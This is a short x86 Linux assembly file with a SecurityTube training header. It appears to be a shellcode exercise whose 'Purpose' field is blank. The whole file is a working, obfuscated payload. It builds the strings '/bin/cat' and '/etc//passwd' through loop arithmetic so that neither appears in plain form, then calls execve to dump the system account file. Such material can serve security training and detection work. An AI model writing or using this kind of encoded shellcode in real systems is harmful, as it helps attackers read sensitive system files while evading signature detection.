; Filename: .nasm
; Author:  Vivek Ramachandran
; Website:  http://securitytube.net
; Training: http://securitytube-training.com 
;
;
; Purpose: 

global _start			

section .text
_start:
    xor ecx, ecx
    mul ecx
    push esi
    mov cl, 16
    mov edi, 0x7461633f
    mov edx, 0x6e69623f

a:
    dec edi
    dec edx
    loop a

    push edi
    push edx

    mov ebx, esp
    push ecx

    mov edi, 0x64777363
    mov edx, 0x61702f1f
    mov esi, 0x6374651f

    mov cl, 16
b:
    inc edi
    inc edx
    inc esi
    loop b

    push edi
    push edx
    push esi

    mov ecx, esp

    mov al, 11
    xor edx, edx
    push edx
    push ecx
    push ebx
    mov ecx, esp
    int 0x80
